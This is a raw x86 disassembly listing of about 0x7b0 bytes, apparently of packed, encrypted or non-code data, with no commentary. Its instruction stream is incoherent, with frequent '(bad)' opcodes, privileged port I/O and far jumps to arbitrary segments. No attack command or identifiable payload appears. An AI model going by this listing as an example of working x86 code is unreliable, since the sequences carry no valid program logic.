  41890d:	fs adc dh,BYTE PTR es:[edi-0x75f2e8b9]
  418915:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418916:	mov    edi,0x52340be6
  41891b:	pushf  
  41891c:	mov    dl,0x41
  41891e:	repz dec edx
  418920:	arpl   WORD PTR [esi-0x38174f47],cx
  418926:	inc    ebx
  418927:	out    dx,al
  418928:	inc    edi
  418929:	scas   al,BYTE PTR es:[edi]
  41892a:	sub    ecx,esi
  41892c:	fwait
  41892d:	push   esi
  41892e:	pop    ds
  41892f:	test   eax,0x47b8a4a6
  418934:	push   eax
  418935:	add    eax,0x2728d099
  41893a:	cmp    BYTE PTR [edi-0x4f09e653],dh
  418940:	inc    edx
  418941:	add    BYTE PTR [edx],cl
  418943:	and    eax,0x4d5eb11a
  418948:	loop   0x418953
  41894a:	cmp    edx,DWORD PTR [ebp+0x4a]
  41894d:	int3   
  41894e:	push   ebx
  41894f:	sti    
  418950:	mov    edi,0x5e082c0
  418955:	sti    
  418956:	daa    
  418957:	sub    al,BYTE PTR [ebp-0x38]
  41895a:	push   esi
  41895b:	lods   eax,DWORD PTR fs:[esi]
  41895d:	lods   eax,DWORD PTR ds:[esi]
  41895e:	ret    0x1e2f
  418961:	enter  0x9d27,0x5a
  418965:	xor    eax,0x5ebc4634
  41896a:	mov    esp,0x9bf321fe
  41896f:	jle    0x418995
  418971:	cmc    
  418972:	(bad)  
  418973:	aad    0xf6
  418975:	mov    ds:0x56bf111d,al
  41897a:	push   ebx
  41897b:	pop    si
  41897d:	mov    bl,0x7b
  41897f:	fiadd  DWORD PTR [ecx+0x5a]
  418982:	add    edx,DWORD PTR [edi-0x76]
  418985:	sub    esi,DWORD PTR [esp+ecx*8-0x42786b73]
  41898c:	jb     0x4189ba
  41898e:	xchg   esi,eax
  41898f:	stos   BYTE PTR es:[edi],al
  418990:	aas    
  418991:	icebp  
  418992:	loop   0x4189c3
  418994:	test   BYTE PTR [eax+0x4c1c93e2],ch
  41899a:	xor    DWORD PTR [esp+esi*4],esp
  41899d:	popf   
  41899e:	xor    BYTE PTR [eax-0x34],al
  4189a1:	cwde   
  4189a2:	fwait
  4189a3:	and    edi,DWORD PTR ss:[ebx+0x24]
  4189a7:	or     DWORD PTR [ebp-0x2cd3fad0],ebp
  4189ad:	addr16 test bh,cl
  4189b0:	and    DWORD PTR [eax],0xfffffff8
  4189b3:	dec    ebx
  4189b4:	popa   
  4189b5:	cdq    
  4189b6:	retf   0x1888
  4189b9:	int    0x71
  4189bb:	dec    edx
  4189bc:	or     bh,BYTE PTR [esi-0x4f371ae5]
  4189c2:	jmp    0xeea0:0x76b3903e
  4189c9:	loopne 0x4189c8
  4189cb:	xlat   BYTE PTR ds:[ebx]
  4189cc:	mov    eax,0xe6e2a67a
  4189d1:	adc    edi,ebx
  4189d3:	xor    BYTE PTR [ebx-0x55],0x85
  4189d7:	ficomp WORD PTR [ebp+0x15ebb0b9]
  4189dd:	mov    eax,ds:0xb626fc13
  4189e2:	cmp    BYTE PTR [edi+edi*4+0x34],cl
  4189e6:	dec    esp
  4189e7:	shl    DWORD PTR [eax],cl
  4189e9:	stc    
  4189ea:	mov    ch,0x6e
  4189ec:	add    dl,ch
  4189ee:	xor    bl,bl
  4189f0:	popa   
  4189f1:	arpl   ax,cx
  4189f3:	mov    eax,0xaae34792
  4189f8:	aaa    
  4189f9:	fisttp WORD PTR [ebx]
  4189fb:	xchg   edx,eax
  4189fc:	mov    ds:0x9f97dc98,eax
  418a01:	daa    
  418a02:	dec    edx
  418a03:	adc    al,0x4d
  418a05:	ins    BYTE PTR es:[edi],dx
  418a06:	or     BYTE PTR [edx],dh
  418a08:	sbb    al,0xa
  418a0a:	add    eax,0xf7f5ce3d
  418a0f:	and    ah,BYTE PTR [edx+0x4c]
  418a12:	int3   
  418a13:	popf   
  418a14:	test   al,0xa2
  418a16:	ret    
  418a17:	jl     0x4189c3
  418a19:	repz or eax,0x94579f09
  418a1f:	ret    
  418a20:	in     al,dx
  418a21:	sbb    BYTE PTR [edi-0x23],dh
  418a24:	aam    0x90
  418a26:	pop    ebx
  418a27:	imul   edx,DWORD PTR [esi-0x1c],0x7c230a26
  418a2e:	push   edx
  418a2f:	dec    edi
  418a30:	das    
  418a31:	repnz or dh,BYTE PTR [eax+ebp*4-0x46]
  418a36:	outs   dx,DWORD PTR ds:[esi]
  418a37:	adc    DWORD PTR [edx],ecx
  418a39:	mov    esp,0x13fad38f
  418a3e:	fwait
  418a3f:	je     0x418aa3
  418a41:	lea    esi,es:[ecx]
  418a44:	ds stos BYTE PTR es:[edi],al
  418a46:	imul   eax,DWORD PTR [edi-0x7582918e],0x941a307f
  418a50:	jle    0x418a61
  418a52:	and    ah,dh
  418a54:	loope  0x418a35
  418a56:	sub    ebx,edx
  418a58:	sbb    eax,DWORD PTR [edx-0x7]
  418a5b:	push   eax
  418a5c:	jns    0x418ac6
  418a5e:	sub    al,0xf6
  418a60:	jnp    0x418ad4
  418a62:	xchg   BYTE PTR [edi-0x43fe787a],ah
  418a68:	inc    edx
  418a69:	mov    al,ds:0x57fb3834
  418a6e:	mov    ebp,ebx
  418a70:	pop    DWORD PTR ds:0x4fbe8ff0
  418a76:	mov    WORD PTR ds:[eax+ebp*4+0xb9ca69d],es
  418a7e:	call   0x85e1bac3
  418a83:	(bad)  
  418a84:	out    0x2a,eax
  418a86:	push   ecx
  418a87:	arpl   bx,bp
  418a89:	sub    ebx,edx
  418a8b:	dec    ebx
  418a8c:	dec    esi
  418a8d:	sub    ch,bh
  418a8f:	bound  edx,QWORD PTR [esi+edi*4-0x1c]
  418a93:	mov    ds:0x5f0c0e63,eax
  418a98:	inc    esi
  418a99:	dec    esi
  418a9a:	fiadd  DWORD PTR [ebx-0x44]
  418a9d:	ror    DWORD PTR [edi+0x359f2cb2],0x84
  418aa4:	loopne 0x418ad7
  418aa6:	sahf   
  418aa7:	push   ebp
  418aa8:	das    
  418aa9:	adc    al,0x76
  418aab:	inc    edx
  418aac:	xlat   BYTE PTR ds:[ebx]
  418aad:	sbb    edi,DWORD PTR [ebx+0x78]
  418ab0:	scas   eax,DWORD PTR es:[edi]
  418ab1:	loop   0x418afa
  418ab3:	imul   ebx,DWORD PTR [eax-0x25],0x0
  418ab7:	test   al,0x4c
  418ab9:	adc    eax,0xeee50a26
  418abe:	mov    ebp,DWORD PTR [esi-0x269129d3]
  418ac4:	into   
  418ac5:	add    esp,DWORD PTR [edi+ecx*2-0x2787a672]
  418acc:	aaa    
  418acd:	shl    bl,0x72
  418ad0:	add    eax,0x521bbe98
  418ad5:	or     dl,BYTE PTR [eax-0x7f5bd2ac]
  418adb:	test   al,0x41
  418add:	iret   
  418ade:	sbb    bh,BYTE PTR [esi+0x3d80e7d0]
  418ae4:	sahf   
  418ae5:	dec    ebp
  418ae6:	call   DWORD PTR [edx+edi*8-0x64]
  418aea:	lods   eax,DWORD PTR ds:[esi]
  418aeb:	int    0x94
  418aed:	add    DWORD PTR [edi+0x36],ecx
  418af0:	repz xor dl,BYTE PTR [esi]
  418af3:	pop    eax
  418af4:	sub    DWORD PTR [edi],edx
  418af6:	out    dx,al
  418af7:	mov    DWORD PTR [ecx-0x32],ebp
  418afa:	jae    0x418aa8
  418afc:	add    dh,BYTE PTR [edx]
  418afe:	and    cl,BYTE PTR ds:0xf4c1f66b
  418b04:	mov    ds:0x109a3160,al
  418b09:	mov    eax,ds:0x43deb64d
  418b0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b0f:	jmp    0x5a5c:0x7cbf15d4
  418b16:	int3   
  418b17:	or     cl,al
  418b19:	jmp    0x1eb8:0xa2193fa7
  418b20:	cmp    eax,0x9fa15055
  418b25:	pop    ebp
  418b26:	fsubr  DWORD PTR [eax+edx*2+0x6702cb26]
  418b2d:	in     eax,dx
  418b2e:	xchg   BYTE PTR [ecx+0x4],al
  418b31:	jmp    0x418b90
  418b33:	fst    DWORD PTR [edx-0x26102245]
  418b39:	and    ah,BYTE PTR [esi+eiz*4+0x14]
  418b3d:	jns    0x418ba2
  418b3f:	out    dx,eax
  418b40:	add    al,0x99
  418b42:	cmp    al,BYTE PTR gs:[edx-0x1]
  418b46:	xor    eax,0x41e96a
  418b4b:	mov    eax,DWORD PTR [edx+0x194]
  418b51:	jmp    0x418e6b
  418b56:	retf   
  418b57:	into   
  418b58:	ret    
  418b59:	ret    
  418b5a:	(bad)  
  418b5c:	retf   
  418b5d:	(bad)  
  418b5e:	xor    dh,cl
  418b60:	stos   DWORD PTR es:[edi],eax
  418b61:	push   eax
  418b62:	inc    eax
  418b63:	push   0xffffffd5
  418b65:	not    BYTE PTR [edx]
  418b67:	ret    
  418b68:	jg     0x418be2
  418b6a:	jnp    0x418bea
  418b6c:	js     0x418be6
  418b6e:	arpl   WORD PTR [eax+ecx*4-0x60],si
  418b72:	(bad)  
  418b73:	or     eax,0xefce1432
  418b78:	ins    DWORD PTR es:[edi],dx
  418b79:	push   edx
  418b7a:	add    eax,0xb9bd3de1
  418b7f:	push   ebx
  418b80:	pop    es
  418b81:	sub    esi,edx
  418b83:	mov    esi,0x890beb47
  418b88:	(bad)  
  418b89:	nop
  418b8a:	std    
  418b8b:	sub    esi,DWORD PTR ds:0xd576e804
  418b91:	dec    ebx
  418b92:	push   cs
  418b93:	or     DWORD PTR [edi],eax
  418b95:	ds (bad) 
  418b97:	les    ecx,FWORD PTR [eax+0x549a5e40]
  418b9d:	xchg   ebp,eax
  418b9e:	adc    BYTE PTR [esi-0x243e4c5c],cl
  418ba4:	mov    esp,0x1b78ca57
  418ba9:	loop   0x418bd9
  418bab:	pop    esp
  418bac:	fldenv [ecx-0x27]
  418baf:	pop    edx
  418bb0:	inc    ecx
  418bb1:	inc    esi
  418bb2:	(bad)  
  418bb3:	(bad)  
  418bb4:	adc    eax,0xdc12e4b0
  418bb9:	loope  0x418bd5
  418bbb:	leave  
  418bbc:	mov    ah,bl
  418bbe:	ins    DWORD PTR es:[edi],dx
  418bbf:	fs xchg esp,eax
  418bc1:	dec    ebx
  418bc2:	pop    ss
  418bc3:	dec    ebp
  418bc4:	pop    eax
  418bc5:	not    DWORD PTR [edi-0x50c99ed6]
  418bcb:	or     al,ah
  418bcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418bce:	in     al,dx
  418bcf:	fisttp QWORD PTR [esi+0x28fe915b]
  418bd5:	popa   
  418bd6:	xchg   ebp,eax
  418bd7:	loopne 0x418bf4
  418bd9:	xlat   BYTE PTR ds:[ebx]
  418bda:	sub    ebp,DWORD PTR [edi+0xd9c6c65]
  418be0:	pop    ebx
  418be1:	xor    eax,0x54568652
  418be6:	push   edi
  418be7:	xor    eax,0x86900f5f
  418bec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418bed:	icebp  
  418bee:	adc    DWORD PTR [ebp+eax*1-0x1c257d1e],0xc9dd1e1
  418bf9:	push   edx
  418bfa:	inc    ebp
  418bfb:	jg     0x418b92
  418bfd:	fs push ebx
  418bff:	inc    edi
  418c00:	mov    cl,0x90
  418c02:	shl    ebp,cl
  418c04:	in     eax,dx
  418c05:	aad    0x33
  418c07:	jge    0x418c3d
  418c09:	frstor [eax]
  418c0b:	js     0x418c10
  418c0d:	imul   ebx,edi,0xffffffe3
  418c10:	and    ecx,DWORD PTR [eax]
  418c12:	cmp    al,0xda
  418c14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c15:	xor    esp,DWORD PTR [ecx]
  418c17:	(bad)  
  418c18:	or     al,0x7f
  418c1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c1b:	aam    0x8f
  418c1d:	jo     0x418c2f
  418c1f:	dec    esi
  418c20:	xlat   BYTE PTR ds:[ebx]
  418c21:	cli    
  418c22:	adc    BYTE PTR [ebp+0x3ed80941],0x91
  418c29:	rcr    bl,1
  418c2b:	mov    ?,WORD PTR [ecx-0x2f]
  418c2e:	fisttp WORD PTR [ebx+0x45498a37]
  418c34:	das    
  418c35:	dec    esi
  418c36:	cmc    
  418c37:	mov    BYTE PTR [edi],cl
  418c39:	popa   
  418c3a:	cld    
  418c3b:	pop    ds
  418c3c:	adc    bl,BYTE PTR [ecx-0x1b728d5a]
  418c42:	pop    ebx
  418c43:	mov    esi,0x5751979b
  418c48:	xchg   esp,eax
  418c49:	out    0xd,eax
  418c4b:	rcr    DWORD PTR [ebx-0x69],1
  418c4e:	adc    BYTE PTR [edi],bl
  418c50:	imul   ebx,DWORD PTR [edx+edi*2],0x3b6d20b6
  418c57:	(bad)  
  418c59:	(bad)  
  418c5a:	jmp    0x9714:0xfff0d243
  418c61:	ret    0xab3e
  418c64:	mov    bl,0xce
  418c66:	dec    ebx
  418c67:	inc    esi
  418c68:	sahf   
  418c69:	adc    BYTE PTR [edi-0x21],0xe6
  418c6d:	ins    BYTE PTR es:[edi],dx
  418c6e:	pop    eax
  418c6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c70:	addr16 mov ds:0xb8de,eax
  418c74:	jae    0x418c40
  418c76:	or     al,BYTE PTR [edx-0x35faad36]
  418c7c:	pop    ds
  418c7d:	and    DWORD PTR [eax+esi*1+0x4966aa48],0x28f8aa2c
  418c88:	lods   eax,DWORD PTR cs:[esi]
  418c8a:	or     BYTE PTR [edi-0x182d9a58],ah
  418c90:	rcr    DWORD PTR [ecx],0x72
  418c93:	xchg   esi,eax
  418c94:	pop    eax
  418c95:	mov    al,bl
  418c97:	mov    ch,0x16
  418c99:	je     0x418c86
  418c9b:	pop    eax
  418c9c:	mov    dl,0xb4
  418c9e:	cdq    
  418c9f:	fisubr WORD PTR gs:[ebx+ebx*8]
  418ca3:	push   ecx
  418ca4:	or     al,BYTE PTR es:[eax+0x6c]
  418ca8:	sub    BYTE PTR [ecx],dl
  418caa:	or     al,0x7a
  418cac:	iret   
  418cad:	and    BYTE PTR [ebp+0x7484ad92],cl
  418cb3:	cmp    bl,BYTE PTR [ebx-0x5025c535]
  418cb9:	and    ah,BYTE PTR [edi+0x7b047ee8]
  418cbf:	sbb    BYTE PTR [edx+0x26],al
  418cc2:	sub    BYTE PTR [edi-0x3ed31d57],bh
  418cc8:	jnp    0x418cda
  418cca:	mov    BYTE PTR [edi],dh
  418ccc:	and    eax,0xffffffdc
  418ccf:	das    
  418cd0:	loopne 0x418c6a
  418cd2:	out    dx,eax
  418cd3:	and    al,0x3c
  418cd5:	mov    ebp,0x3ae53a59
  418cda:	std    
  418cdb:	cli    
  418cdc:	out    0xf2,eax
  418cde:	js     0x418cda
  418ce0:	ins    DWORD PTR es:[edi],dx
  418ce1:	xchg   esp,eax
  418ce2:	sub    al,bh
  418ce4:	int3   
  418ce5:	or     BYTE PTR [edx-0x15],ah
  418ce8:	mov    ah,0xa8
  418cea:	shl    DWORD PTR [edi-0x37e85837],0xc0
  418cf1:	call   0xef22:0xab8d2595
  418cf8:	or     al,0xa2
  418cfa:	cmp    al,0x11
  418cfc:	mov    bl,0x24
  418cfe:	inc    edx
  418cff:	mov    al,ds:0x6b52f20f
  418d04:	push   ds
  418d05:	or     dh,BYTE PTR [ecx]
  418d07:	xchg   esi,eax
  418d08:	(bad)  
  418d09:	xor    al,0xcc
  418d0b:	xchg   edi,eax
  418d0c:	xor    edi,DWORD PTR [edx]
  418d0e:	repnz int3 
  418d10:	xchg   edx,eax
  418d11:	leave  
  418d12:	inc    edi
  418d13:	add    ch,BYTE PTR [eax+ebp*1+0x18ce8c6c]
  418d1a:	or     eax,0x32598579
  418d1f:	int3   
  418d20:	xchg   ecx,eax
  418d21:	ror    DWORD PTR [edx+0x27],0x7f
  418d25:	sahf   
  418d26:	loop   0x418d52
  418d28:	jnp    0x418d07
  418d2a:	cmp    eax,0x91988892
  418d2f:	ror    BYTE PTR [eax+0x7cfc3bd8],0x71
  418d36:	test   al,0xf4
  418d38:	iret   
  418d39:	cmp    BYTE PTR [edx+0x54252a2d],bh
  418d3f:	cmc    
  418d40:	push   es
  418d41:	shr    BYTE PTR [esi-0x559ffbea],cl
  418d47:	xor    eax,0x53ff647
  418d4c:	ret    
  418d4d:	mov    bl,0xc0
  418d4f:	and    al,0x32
  418d51:	cmp    bh,BYTE PTR [ebx-0x68]
  418d54:	xadd   DWORD PTR [esi+0x64],ebp
  418d58:	push   ss
  418d59:	or     dl,BYTE PTR [ebp+esi*4+0x53]
  418d5d:	pusha  
  418d5e:	sbb    ch,BYTE PTR [edx+ebx*8+0x5c]
  418d62:	iret   
  418d63:	cmp    edi,DWORD PTR [eax-0x15]
  418d66:	adc    bl,al
  418d68:	jmp    0x418d6d
  418d6a:	sub    DWORD PTR es:[eax+0x1e1a6b21],eax
  418d71:	jns    0x418d3f
  418d73:	push   cs
  418d74:	pop    esp
  418d75:	inc    ebx
  418d76:	or     eax,0x6dcdfdde
  418d7b:	push   0xffffffe2
  418d7d:	scas   al,BYTE PTR es:[edi]
  418d7e:	(bad)  
  418d7f:	in     al,dx
  418d80:	adc    DWORD PTR ds:0x4d625fac,edx
  418d86:	fs pusha 
  418d88:	add    DWORD PTR [ebp+0x1679449c],0x9083c70
  418d92:	es cld 
  418d94:	outs   dx,DWORD PTR ds:[esi]
  418d95:	push   edi
  418d96:	inc    eax
  418d97:	mov    WORD PTR [ebp+0x3e],ss
  418d9a:	push   ecx
  418d9b:	jmp    0x282e:0xfc2dc08a
  418da2:	jnp    0x418de6
  418da4:	jns    0x418d80
  418da6:	xchg   esi,eax
  418da8:	dec    ebx
  418da9:	push   edi
  418daa:	push   ds
  418dab:	xchg   ebx,eax
  418dac:	ror    ch,0x32
  418daf:	inc    ebx
  418db0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418db1:	dec    esp
  418db2:	sub    al,0xaa
  418db4:	add    al,0x1a
  418db6:	xor    BYTE PTR ds:0x641d358,bl
  418dbc:	(bad)  
  418dbd:	xchg   ebx,eax
  418dbe:	ss pusha 
  418dc0:	loope  0x418d61
  418dc2:	stos   BYTE PTR es:[edi],al
  418dc3:	xchg   edx,eax
  418dc4:	jbe    0x418dd0
  418dc6:	xor    DWORD PTR [edi],edi
  418dc8:	pop    esp
  418dc9:	jecxz  0x418e49
  418dcb:	call   0xa311:0xcb79f101
  418dd2:	push   0x327ed0a5
  418dd7:	aad    0x60
  418dd9:	push   ds
  418dda:	icebp  
  418ddb:	out    0x72,al
  418ddd:	(bad)  
  418dde:	cmp    BYTE PTR [ebp+0xb9af2ba],cl
  418de4:	mov    edx,0xd6bc2f1f
  418de9:	mov    BYTE PTR [ebx],0xab
  418dec:	leave  
  418ded:	push   esi
  418dee:	setnp  BYTE PTR [edi+edx*2]
  418df2:	push   esi
  418df3:	xor    al,0xa
  418df5:	mov    eax,ds:0x3e386936
  418dfa:	in     eax,dx
  418dfb:	cmp    eax,0xcabd3a6c
  418e00:	iret   
  418e01:	lock push cs
  418e03:	test   al,0xfb
  418e05:	das    
  418e06:	push   ebx
  418e07:	sar    ebx,1
  418e09:	out    dx,eax
  418e0a:	outs   dx,DWORD PTR ds:[esi]
  418e0b:	xor    eax,0x4ef9b7e1
  418e10:	nop
  418e11:	dec    esp
  418e12:	or     eax,0xb493910
  418e17:	lods   eax,DWORD PTR ds:[esi]
  418e18:	call   0xe2be:0x9da5f8c9
  418e1f:	arpl   WORD PTR [ecx+0x221b8176],si
  418e25:	dec    ebp
  418e26:	mov    dl,0xd0
  418e28:	mov    ds:0x3dcee1bf,al
  418e2d:	(bad)  
  418e2e:	cmp    al,0xee
  418e30:	ds mov al,bh
  418e33:	out    dx,eax
  418e34:	test   al,0x49
  418e36:	lods   al,BYTE PTR ds:[esi]
  418e37:	mov    edx,eax
  418e39:	sbb    bl,dh
  418e3b:	xchg   ecx,eax
  418e3c:	xchg   edx,eax
  418e3d:	and    eax,DWORD PTR [ebx]
  418e3f:	jle    0x418df8
  418e41:	fxch   st(2)
  418e43:	das    
  418e44:	fdivrp st(6),st
  418e46:	sub    ebp,DWORD PTR [ebx+0x50]
  418e49:	pop    ds
  418e4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e4b:	enter  0xb259,0xe7
  418e4f:	test   al,0x60
  418e51:	jp     0x418e4a
  418e53:	push   edi
  418e54:	pop    edi
  418e55:	mov    bh,0xa2
  418e57:	rcr    BYTE PTR [edi],1
  418e59:	push   ss
  418e5a:	rcr    bh,0xbb
  418e5d:	push   edi
  418e5e:	jp     0x418e3c
  418e60:	mov    al,0x13
  418e62:	and    eax,DWORD PTR [ebp-0x70]
  418e65:	out    0xf0,al
  418e67:	pop    es
  418e68:	pop    ss
  418e69:	mov    eax,ds:0x8b30ff18
  418e6e:	inc    ebp
  418e6f:	adc    cl,ch
  418e71:	adc    eax,0xcb000003
  418e76:	rol    dl,cl
  418e78:	(bad)  
  418e79:	(bad)  
  418e7b:	leave  
  418e7c:	shl    DWORD PTR [esi+0x11],1
  418e7f:	(bad)  
  418e81:	cmp    BYTE PTR [edi-0x66],0xf4
  418e85:	or     eax,0x7b787fc0
  418e8a:	jle    0x418f04
  418e8c:	js     0x418ec7
  418e8e:	and    bh,dl
  418e90:	sub    BYTE PTR [ecx],ah
  418e92:	std    
  418e93:	xor    al,0x2b
  418e95:	mov    ch,0xc5
  418e97:	icebp  
  418e98:	leave  
  418e99:	adc    eax,0x66df13d3
  418e9e:	retf   
  418e9f:	sbb    al,0x22
  418ea1:	shr    BYTE PTR [ebx+0x72],cl
  418ea4:	jno    0x418e94
  418ea6:	xor    bl,bl
  418ea8:	mov    cl,0x2
  418eaa:	mov    esp,0xf8a82f04
  418eaf:	jne    0x418f22
  418eb1:	mov    fs,esp
  418eb3:	mov    esp,0x4a94d9dd
  418eb8:	icebp  
  418eb9:	test   DWORD PTR [eax+0x3],0xf9ff17c0
  418ec0:	and    DWORD PTR ds:0x387a0056,ebx
  418ec6:	add    esi,esi
  418ec8:	std    
  418ec9:	mov    ds:0xb84b7455,eax
  418ece:	lods   eax,DWORD PTR ds:[esi]
  418ecf:	jns    0x418f49
  418ed1:	test   ebp,0x69e564aa
  418ed7:	xchg   edi,eax
  418ed8:	adc    eax,0x14a0319c
  418edd:	ds dec esp
  418edf:	mov    al,0x8
  418ee1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ee2:	outs   dx,DWORD PTR ds:[esi]
  418ee3:	sub    ah,al
  418ee5:	cli    
  418ee6:	add    ebx,DWORD PTR [edx-0x3d]
  418ee9:	imul   esi,ebp,0xff0aa2
  418eef:	push   ebp
  418ef0:	xor    ecx,DWORD PTR [esp]
  418ef3:	mov    edx,DWORD PTR [esi-0x48]
  418ef6:	int    0x45
  418ef8:	sub    al,0xef
  418efa:	shl    BYTE PTR [ecx-0x759911e0],cl
  418f00:	sub    eax,0x3cc61875
  418f05:	mov    esp,0x55aa9597
  418f0a:	xchg   ecx,eax
  418f0b:	add    eax,0x7f3325ac
  418f10:	ja     0x418f67
  418f12:	pop    esp
  418f13:	mov    ss,WORD PTR [esi-0x7d]
  418f16:	cmp    al,0x48
  418f18:	(bad)  [edi+0x39]
  418f1b:	sub    ah,BYTE PTR [ecx-0x4f336ce2]
  418f21:	imul   eax,ebx,0x41
  418f24:	(bad)  
  418f25:	xor    ebp,edx
  418f27:	push   ebp
  418f28:	(bad)  
  418f2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f2b:	or     ecx,DWORD PTR [ebx-0x27a8793f]
  418f31:	je     0x418f52
  418f33:	imul   eax,DWORD PTR [ebp-0x12],0x3a
  418f37:	retf   0xa809
  418f3a:	into   
  418f3b:	cmc    
  418f3c:	aad    0x9f
  418f3e:	sub    DWORD PTR [edi],edi
  418f40:	fs sbb al,0x9f
  418f43:	rol    DWORD PTR [esi],cl
  418f45:	jp     0x418f77
  418f47:	xor    edi,DWORD PTR [ebx+0x3fb7e46c]
  418f4d:	sbb    eax,0x69b937a6
  418f52:	cmp    al,0xdc
  418f54:	cmp    bh,BYTE PTR [edi+ecx*4]
  418f57:	repz or eax,0xbce14fcf
  418f5d:	jae    0x418fc8
  418f5f:	add    DWORD PTR [edx-0x2f4c54dd],edx
  418f65:	call   0xdfc64915
  418f6a:	dec    ecx
  418f6b:	or     ecx,DWORD PTR [eax+edx*4-0x99b4428]
  418f72:	add    ch,cl
  418f74:	test   al,0x22
  418f76:	xchg   ebx,eax
  418f77:	scas   eax,DWORD PTR es:[edi]
  418f78:	mov    edi,0xe8bc83b3
  418f7d:	push   0xf1e5be81
  418f82:	cli    
  418f83:	sbb    eax,0x7cbb8a8e
  418f88:	adc    BYTE PTR [ebp+0x33],0x6
  418f8c:	push   edx
  418f8d:	cs (bad) 
  418f8f:	rcr    DWORD PTR [ebp+0x4e],1
  418f92:	and    BYTE PTR [eax],al
  418f94:	pop    ecx
  418f95:	(bad)  
  418f97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f98:	jne    0x418f2f
  418f9a:	xchg   esi,eax
  418f9b:	test   BYTE PTR [eax],bh
  418f9d:	rcl    DWORD PTR [ebp+0x6f],1
  418fa0:	les    ebp,FWORD PTR ds:0xf7d4b4d9
  418fa6:	aaa    
  418fa7:	sbb    DWORD PTR [edi-0x2b5478a7],ecx
  418fad:	fbstp  TBYTE PTR [edx+0x45]
  418fb0:	push   esp
  418fb1:	adc    BYTE PTR [ebx],cl
  418fb3:	mov    bl,BYTE PTR [esi-0x60004058]
  418fb9:	(bad)  
  418fbb:	sti    
  418fbc:	add    eax,0x71c676f8
  418fc1:	pop    edx
  418fc2:	and    bl,BYTE PTR [edx+0x24]
  418fc5:	mov    dh,0x84
  418fc7:	rol    cl,1
  418fc9:	cmp    bl,BYTE PTR [ebx]
  418fcb:	xchg   edi,eax
  418fcc:	out    dx,eax
  418fcd:	out    dx,eax
  418fce:	push   ecx
  418fcf:	jmp    0x418fd0
  418fd1:	nop
  418fd2:	sar    DWORD PTR [eax+ebx*4-0x2c],1
  418fd6:	(bad)  
  418fd7:	(bad)  
  418fd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418fd9:	lahf   
  418fda:	xor    DWORD PTR [edx+0x55],0xffffffdf
  418fde:	sbb    BYTE PTR [ecx+0x1d4bd7a1],al
  418fe4:	in     eax,0xd0
  418fe6:	(bad)  
  418fe7:	push   0xdee712f2
  418fec:	(bad)  [ecx]
  418fee:	and    eax,0x87ff5600
  418ff3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ff4:	mov    eax,gs
  418ff6:	js     0x419025
  418ff8:	push   esi
  418ff9:	lea    edx,[ecx]
  418ffb:	dec    ebx
  418ffc:	xor    edi,edx
  418ffe:	dec    edi
  418fff:	dec    DWORD PTR [ebp+0x16]
  419002:	out    dx,eax
  419003:	inc    ebp
  419004:	push   0x4d439835
  419009:	xchg   edi,eax
  41900a:	mov    ebp,DWORD PTR [eax-0x6fa4c5e0]
  419010:	(bad)  
  419011:	lds    eax,FWORD PTR [esi+0x2e5734b]
  419017:	test   ecx,esi
  419019:	sti    
  41901a:	je     0x418fd1
  41901c:	shl    DWORD PTR [eax-0x56ed21d2],0x82
  419023:	out    dx,al
  419024:	inc    edi
  419025:	pop    es
  419026:	cld    
  419027:	test   DWORD PTR [edx+0x73],ecx
  41902a:	pushf  
  41902b:	stos   DWORD PTR es:[edi],eax
  41902c:	push   cs
  41902d:	and    bh,dl
  41902f:	stos   BYTE PTR es:[edi],al
  419030:	aaa    
  419031:	fld    TBYTE PTR [ebx+0x6d]
  419034:	(bad)  [ecx+0x12]
  419037:	jg     0x418fdd
  419039:	sbb    DWORD PTR [ebp-0x73],ecx
  41903c:	xchg   esp,eax
  41903d:	jmp    0x39e1:0x640303ea
  419044:	dec    esp
  419045:	adc    al,0xe1
  419047:	xor    BYTE PTR [ebx+edx*4+0x71],dl
  41904b:	or     esp,DWORD PTR [ecx+0x189fe2cd]
  419051:	add    edx,eax
  419053:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419054:	hlt    
  419055:	jmp    0x4190d2
  419057:	neg    al
  419059:	jne    0x4190ac
  41905b:	push   cs
  41905c:	cmp    esi,DWORD PTR [ebp+0x7af461a7]
  419062:	push   eax
  419063:	mov    edi,0x8439b41f
  419068:	mov    ah,0x53
  41906a:	jo     0x419039
  41906c:	cld    
  41906d:	push   ss
  41906e:	jmp    0x9fdc:0x7a04620a
  419075:	push   ds
  419076:	jle    0x41902f
  419078:	jg     0x41905e
  41907a:	jne    0x4190c5
  41907c:	lods   eax,DWORD PTR ds:[esi]
  41907d:	and    eax,0x4696ebfe
  419082:	jp     0x4190bd
  419084:	add    esp,DWORD PTR [ecx]
  419086:	jb     0x419020
  419088:	imul   esi,DWORD PTR [eax+0x28edc244],0x2c
  41908f:	xchg   esp,eax
  419090:	xchg   esp,eax
  419091:	(bad)
  419095:	repz jp 0x419097
  419098:	int    0x27
  41909a:	xlat   BYTE PTR ds:[ebx]
  41909b:	jnp    0x41910e
  41909d:	xchg   BYTE PTR [edx+0x309c01dc],cl
  4190a3:	cmp    BYTE PTR [ecx-0x74],dh
  4190a6:	popf   
  4190a7:	xchg   esp,eax
  4190a8:	aam    0x5
  4190aa:	nop
  4190ab:	and    edx,DWORD PTR [ebx+0x42]
  4190ae:	out    0x93,al
  4190b0:	and    ebx,DWORD PTR [edx]
  4190b2:	test   al,0x6a
  4190b4:	sbb    al,al
  4190b6:	inc    ecx
  4190b7:	test   eax,0xbba67771
  4190bc:	out    dx,al
  4190bd:	dec    esi
  4190be:	pop    esi
  4190bf:	nop
  4190c0:	clc    
  4190c1:	aad    0xa7
  4190c3:	xchg   esi,eax
  4190c4:	popf   
